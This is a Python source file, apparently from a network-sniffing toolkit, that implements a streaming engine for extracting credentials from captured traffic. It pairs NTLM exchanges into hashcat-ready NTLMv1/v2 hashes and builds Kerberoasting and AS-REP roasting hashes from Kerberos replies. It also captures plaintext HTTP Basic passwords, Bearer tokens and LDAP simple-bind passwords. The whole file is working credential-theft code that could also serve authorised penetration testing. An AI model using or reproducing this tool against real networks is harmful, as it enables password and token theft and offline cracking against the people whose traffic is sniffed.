#!/usr/bin/env python3
"""
STREAMING AUTH ENGINE - Real-Time Credential Extraction

Processes packets in real-time and emits credentials as soon as
a complete challenge/response exchange is detected.

Unlike batch mode, this uses a sliding window correlation that
emits credentials as soon as possible while handling:
    - Out-of-order packets
    - Multiple auth sequences on same stream
    - Session timeouts
"""

import asyncio
from collections import defaultdict
from dataclasses import dataclass, field
from typing import AsyncIterator, Dict, List, Optional, Set, Tuple
from datetime import datetime, timedelta

from .capture import CapturedPacket
from .pipeline import PipelineEvent, EventType


@dataclass
class PendingAuth:
    """A pending authentication exchange awaiting completion."""
    stream_key: str
    protocol: str
    challenge_packet: Optional[CapturedPacket] = None
    response_packet: Optional[CapturedPacket] = None
    created_at: datetime = field(default_factory=datetime.now)
    emitted: bool = False

    def is_complete(self) -> bool:
        """Check if we have both challenge and response."""
        return self.challenge_packet is not None and self.response_packet is not None

    def age_seconds(self) -> float:
        """Get age of this pending auth in seconds."""
        return (datetime.now() - self.created_at).total_seconds()


class StreamingAuthEngine:
    """
    Real-time streaming authentication extractor.

    Processes packets one at a time and emits credentials
    as soon as a complete exchange is detected.

    Features:
        - Immediate emission when challenge+response paired
        - Handles multiple auth sequences per stream
        - Session timeout cleanup
        - Protocol-specific extraction
    """

    # Session timeout in seconds
    SESSION_TIMEOUT = 30.0

    def __init__(
        self,
        protocols: Optional[List[str]] = None,
        session_timeout: float = 30.0,
    ):
        """
        Initialize streaming auth engine.

        Args:
            protocols: Protocols to process (None = all)
            session_timeout: Seconds before incomplete sessions expire
        """
        self.protocols = set(protocols or ["ntlm", "kerberos", "http", "ldap"])
        self.session_timeout = session_timeout

        # Pending authentications by (stream_key, protocol, sequence_num)
        self._pending: Dict[Tuple[str, str, int], PendingAuth] = {}

        # Track sequence numbers per stream to handle multiple auths
        self._stream_sequences: Dict[Tuple[str, str], int] = defaultdict(int)

        # Recently emitted credentials (dedup)
        self._emitted_hashes: Set[str] = set()

        # Stats
        self.packets_processed = 0
        self.credentials_emitted = 0
        self.sessions_timed_out = 0

    async def process_packet(self, packet: CapturedPacket) -> AsyncIterator[PipelineEvent]:
        """
        Process a single packet and yield any resulting events.

        This is the main entry point for streaming processing.
        """
        self.packets_processed += 1

        # Skip if not an auth protocol we care about
        if packet.protocol not in self.protocols:
            return

        # Route to protocol-specific handler
        if packet.protocol == "ntlm":
            async for event in self._process_ntlm(packet):
                yield event
        elif packet.protocol == "kerberos":
            async for event in self._process_kerberos(packet):
                yield event
        elif packet.protocol == "http":
            async for event in self._process_http(packet):
                yield event
        elif packet.protocol == "ldap":
            async for event in self._process_ldap(packet):
                yield event

        # Periodic cleanup of timed out sessions
        if self.packets_processed % 50 == 0:
            await self._cleanup_expired()

    async def _process_ntlm(self, packet: CapturedPacket) -> AsyncIterator[PipelineEvent]:
        """Process NTLM packet."""
        fields = packet.fields
        msg_type = fields.get("ntlmssp.messagetype")

        if not msg_type:
            return

        stream_key = packet.stream_key

        # Type 1 (Negotiate) - starts new sequence
        if msg_type == "0x00000001":
            # Increment sequence for this stream
            self._stream_sequences[(stream_key, "ntlm")] += 1

        # Type 2 (Challenge) - store for pairing
        elif msg_type == "0x00000002":
            seq = self._stream_sequences[(stream_key, "ntlm")]
            key = (stream_key, "ntlm", seq)

            if key not in self._pending:
                self._pending[key] = PendingAuth(stream_key=stream_key, protocol="ntlm")

            self._pending[key].challenge_packet = packet

        # Type 3 (Authenticate) - complete the exchange
        elif msg_type == "0x00000003":
            seq = self._stream_sequences[(stream_key, "ntlm")]
            key = (stream_key, "ntlm", seq)

            if key not in self._pending:
                self._pending[key] = PendingAuth(stream_key=stream_key, protocol="ntlm")

            self._pending[key].response_packet = packet

            # Check if complete
            if self._pending[key].is_complete() and not self._pending[key].emitted:
                cred = self._build_ntlm_credential(self._pending[key])
                if cred:
                    self._pending[key].emitted = True
                    self.credentials_emitted += 1
                    yield PipelineEvent.credential(cred, source="ntlm")

                    # Emit auth attempt event
                    yield PipelineEvent(
                        type=EventType.AUTH_ATTEMPT,
                        timestamp=datetime.now(),
                        data={
                            "protocol": "ntlm",
                            "username": cred.username,
                            "domain": cred.domain,
                            "target": f"{cred.target_ip}:{cred.target_port}",
                        },
                        source="ntlm"
                    )

    def _build_ntlm_credential(self, pending: PendingAuth):
        """Build NTLM credential from pending auth."""
        from ..auth_engine.base import ExtractedCredential, ProtocolMetadata

        challenge = pending.challenge_packet
        response = pending.response_packet

        if not challenge or not response:
            return None

        challenge_fields = challenge.fields
        response_fields = response.fields

        # Get server challenge
        server_challenge = self._get_first(challenge_fields.get("ntlmssp.ntlmserverchallenge", ""))
        if not server_challenge:
            return None

        # Get auth fields
        username = self._get_first(response_fields.get("ntlmssp.auth.username", ""))
        domain = self._get_first(response_fields.get("ntlmssp.auth.domain", ""))
        workstation = self._get_first(response_fields.get("ntlmssp.auth.hostname", ""))

        # Skip null/anonymous
        if not username or username.upper() in ["", "NULL", "ANONYMOUS", "-"]:
            return None

        # Determine NTLMv1 vs NTLMv2
        ntlmv2_response = self._get_first(response_fields.get("ntlmssp.ntlmv2_response", ""))
        ntresponse = self._get_first(response_fields.get("ntlmssp.auth.ntresponse", ""))
        ntproofstr = self._get_first(response_fields.get("ntlmssp.ntlmv2_response.ntproofstr", ""))

        hashcat_format = None
        hashcat_mode = None
        version = None

        if ntlmv2_response and ntproofstr:
            version = "NTLMv2"
            hashcat_mode = 5600

            server_challenge_clean = server_challenge.replace(":", "").lower()
            ntproofstr_clean = ntproofstr.replace(":", "").lower()
            blob = ntlmv2_response.replace(":", "").lower()

            if blob.startswith(ntproofstr_clean):
                blob = blob[len(ntproofstr_clean):]

            hashcat_format = f"{username}::{domain}:{server_challenge_clean}:{ntproofstr_clean}:{blob}"

        elif ntresponse and not ntlmv2_response:
            version = "NTLMv1"
            hashcat_mode = 5500

            lm_response = self._get_first(response_fields.get("ntlmssp.auth.lmresponse", ""))
            lm_clean = lm_response.replace(":", "").lower() if lm_response else ""
            nt_clean = ntresponse.replace(":", "").lower()
            server_challenge_clean = server_challenge.replace(":", "").lower()

            hashcat_format = f"{username}::{domain}:{lm_clean}:{nt_clean}:{server_challenge_clean}"

        # Dedup check - use full hash to avoid losing unique creds
        if hashcat_format:
            if hashcat_format in self._emitted_hashes:
                return None
            self._emitted_hashes.add(hashcat_format)

        # Build metadata
        metadata = ProtocolMetadata()
        major = self._get_first(challenge_fields.get("ntlmssp.version.major", ""))
        minor = self._get_first(challenge_fields.get("ntlmssp.version.minor", ""))
        build = self._get_first(challenge_fields.get("ntlmssp.version.build_number", ""))

        if major and minor:
            metadata.server_version = f"NT {major}.{minor}"
            if build:
                metadata.server_version += f" Build {build}"

        # Determine service
        target_port = response.dst_port
        service_map = {445: "smb", 139: "netbios", 80: "http", 443: "https", 1433: "mssql"}
        target_service = service_map.get(target_port, f"tcp/{target_port}")

        return ExtractedCredential(
            protocol="ntlm",
            username=username,
            domain=domain,
            credential_data={
                "version": version,
                "server_challenge": server_challenge,
                "ntproofstr": ntproofstr,
                "workstation": workstation,
            },
            hashcat_format=hashcat_format,
            hashcat_mode=hashcat_mode,
            source_ip=response.src_ip,
            source_port=response.src_port,
            target_ip=response.dst_ip,
            target_port=target_port,
            target_service=target_service,
            timestamp=response.timestamp,
            metadata=metadata,
        )

    async def _process_kerberos(self, packet: CapturedPacket) -> AsyncIterator[PipelineEvent]:
        """Process Kerberos packet."""
        from ..auth_engine.base import ExtractedCredential, ProtocolMetadata

        fields = packet.fields
        msg_type = fields.get("kerberos.msg_type")

        # We care about AS-REP (11) and TGS-REP (13) for roasting
        if msg_type not in ["11", "13"]:
            return

        # Get cipher
        cipher = self._get_first(fields.get("kerberos.encryptedKDCREPData_cipher", ""))
        if not cipher:
            cipher = self._get_first(fields.get("kerberos.encryptedTicketData_cipher", ""))

        if not cipher:
            return

        realm = self._get_first(fields.get("kerberos.realm", ""))
        cname = self._get_first(fields.get("kerberos.CNameString", ""))
        sname = self._get_first(fields.get("kerberos.SNameString", ""))
        etype = self._get_first(fields.get("kerberos.etype", ""))

        if not cname and not sname:
            return

        # Dedup
        dedup_key = f"krb:{msg_type}:{cname}:{sname}:{cipher[:32]}"
        if dedup_key in self._emitted_hashes:
            return
        self._emitted_hashes.add(dedup_key)

        cipher_clean = cipher.replace(":", "").replace(" ", "").lower()

        if msg_type == "11":
            # AS-REP roasting
            hashcat_format = f"$krb5asrep${etype or '23'}${cname}@{realm}:{cipher_clean}"
            hashcat_mode = 18200
            protocol = "kerberos_asrep"
            username = cname
        else:
            # TGS-REP / Kerberoasting
            hashcat_format = f"$krb5tgs${etype or '23'}$*{cname}${realm}${sname}*${cipher_clean[:32]}${cipher_clean[32:]}"
            hashcat_mode = 13100
            protocol = "kerberos_tgsrep"
            username = sname

        metadata = ProtocolMetadata(target_realm=realm, target_spn=sname)

        cred = ExtractedCredential(
            protocol=protocol,
            username=username,
            domain=realm,
            credential_data={
                "cipher": cipher_clean,
                "etype": etype,
                "attack": "AS-REP Roasting" if msg_type == "11" else "Kerberoasting",
            },
            hashcat_format=hashcat_format,
            hashcat_mode=hashcat_mode,
            source_ip=packet.dst_ip,  # Client received the response
            target_ip=packet.src_ip,  # KDC sent it
            target_port=packet.src_port,
            target_service="kerberos",
            timestamp=packet.timestamp,
            metadata=metadata,
        )

        self.credentials_emitted += 1
        yield PipelineEvent.credential(cred, source="kerberos")

    async def _process_http(self, packet: CapturedPacket) -> AsyncIterator[PipelineEvent]:
        """Process HTTP auth packet."""
        from ..auth_engine.base import ExtractedCredential, ProtocolMetadata
        import base64

        fields = packet.fields
        auth_header = self._get_first(fields.get("http.authorization", ""))

        if not auth_header:
            return

        auth_lower = auth_header.lower()

        # Basic auth (plaintext!)
        if auth_lower.startswith("basic "):
            try:
                encoded = auth_header.split(" ", 1)[1].strip()
                decoded = base64.b64decode(encoded).decode("utf-8", errors="replace")

                if ":" not in decoded:
                    return

                username, password = decoded.split(":", 1)

                # Dedup
                dedup_key = f"http_basic:{username}:{packet.dst_ip}"
                if dedup_key in self._emitted_hashes:
                    return
                self._emitted_hashes.add(dedup_key)

                host = self._get_first(fields.get("http.host", ""))
                uri = self._get_first(fields.get("http.request.uri", ""))

                cred = ExtractedCredential(
                    protocol="http_basic",
                    username=username,
                    domain=host,
                    credential_data={
                        "password": password,  # PLAINTEXT!
                        "auth_type": "Basic",
                        "uri": uri,
                    },
                    source_ip=packet.src_ip,
                    source_port=packet.src_port,
                    target_ip=packet.dst_ip,
                    target_port=packet.dst_port,
                    target_service="http",
                    timestamp=packet.timestamp,
                    metadata=ProtocolMetadata(raw_fields={"host": host, "uri": uri}),
                )

                self.credentials_emitted += 1
                yield PipelineEvent.credential(cred, source="http")

                # Alert for plaintext password
                yield PipelineEvent.alert(
                    f"HTTP Basic Auth - Plaintext password captured: {username}",
                    severity="critical",
                    protocol="http_basic",
                    username=username,
                    target=f"{packet.dst_ip}:{packet.dst_port}"
                )

            except Exception:
                pass

        # Bearer token
        elif auth_lower.startswith("bearer "):
            try:
                token = auth_header.split(" ", 1)[1].strip()

                dedup_key = f"http_bearer:{token[:32]}"
                if dedup_key in self._emitted_hashes:
                    return
                self._emitted_hashes.add(dedup_key)

                host = self._get_first(fields.get("http.host", ""))

                cred = ExtractedCredential(
                    protocol="http_bearer",
                    username="bearer_token",
                    domain=host,
                    credential_data={
                        "token": token,
                        "auth_type": "Bearer",
                    },
                    source_ip=packet.src_ip,
                    target_ip=packet.dst_ip,
                    target_port=packet.dst_port,
                    target_service="http",
                    timestamp=packet.timestamp,
                )

                self.credentials_emitted += 1
                yield PipelineEvent.credential(cred, source="http")

            except Exception:
                pass

    async def _process_ldap(self, packet: CapturedPacket) -> AsyncIterator[PipelineEvent]:
        """Process LDAP bind packet."""
        from ..auth_engine.base import ExtractedCredential, ProtocolMetadata

        fields = packet.fields

        # Check for bind request with simple auth (plaintext password)
        bind_dn = self._get_first(fields.get("ldap.name", ""))
        simple_password = self._get_first(fields.get("ldap.simple", ""))

        if not bind_dn or not simple_password:
            return

        # Dedup
        dedup_key = f"ldap:{bind_dn}:{packet.dst_ip}"
        if dedup_key in self._emitted_hashes:
            return
        self._emitted_hashes.add(dedup_key)

        # Extract username from DN
        username = self._extract_username_from_dn(bind_dn)
        domain = self._extract_domain_from_dn(bind_dn)

        # Check if encrypted
        is_encrypted = packet.dst_port == 636

        metadata = ProtocolMetadata(raw_fields={
            "bind_dn": bind_dn,
            "encrypted": is_encrypted,
            "auth_type": "simple",
        })

        if not is_encrypted:
            metadata.flags["plaintext_password"] = True
            metadata.flags["critical_finding"] = True

        cred = ExtractedCredential(
            protocol="ldap_simple",
            username=username,
            domain=domain,
            credential_data={
                "password": simple_password,  # PLAINTEXT!
                "bind_dn": bind_dn,
                "auth_type": "simple",
                "encrypted": is_encrypted,
            },
            source_ip=packet.src_ip,
            source_port=packet.src_port,
            target_ip=packet.dst_ip,
            target_port=packet.dst_port,
            target_service="ldaps" if is_encrypted else "ldap",
            timestamp=packet.timestamp,
            metadata=metadata,
        )

        self.credentials_emitted += 1
        yield PipelineEvent.credential(cred, source="ldap")

        if not is_encrypted:
            yield PipelineEvent.alert(
                f"LDAP Simple Bind - Plaintext password: {username}@{domain}",
                severity="critical",
                protocol="ldap_simple",
                username=username,
                bind_dn=bind_dn
            )

    async def _cleanup_expired(self):
        """Remove expired pending authentications."""
        now = datetime.now()
        expired_keys = [
            key for key, pending in self._pending.items()
            if pending.age_seconds() > self.session_timeout
        ]

        for key in expired_keys:
            del self._pending[key]
            self.sessions_timed_out += 1

    def _get_first(self, value) -> str:
        """Get first value if list, otherwise return as string."""
        if value is None:
            return ""
        if isinstance(value, list):
            return str(value[0]) if value else ""
        return str(value)

    def _extract_username_from_dn(self, dn: str) -> str:
        """Extract username from LDAP DN."""
        if not dn:
            return ""

        if "\\" in dn:
            return dn.split("\\", 1)[1]

        dn_lower = dn.lower()
        for prefix in ["cn=", "uid=", "samaccountname="]:
            if prefix in dn_lower:
                start = dn_lower.find(prefix) + len(prefix)
                end = dn.find(",", start)
                if end == -1:
                    return dn[start:]
                return dn[start:end]

        return dn

    def _extract_domain_from_dn(self, dn: str) -> str:
        """Extract domain from LDAP DN."""
        if not dn:
            return ""

        if "\\" in dn:
            return dn.split("\\", 1)[0]

        import re
        dc_parts = re.findall(r'dc=([^,]+)', dn, re.IGNORECASE)
        if dc_parts:
            return ".".join(dc_parts)

        return ""

    def get_stats(self) -> dict:
        """Get engine statistics."""
        return {
            "packets_processed": self.packets_processed,
            "credentials_emitted": self.credentials_emitted,
            "pending_sessions": len(self._pending),
            "sessions_timed_out": self.sessions_timed_out,
        }
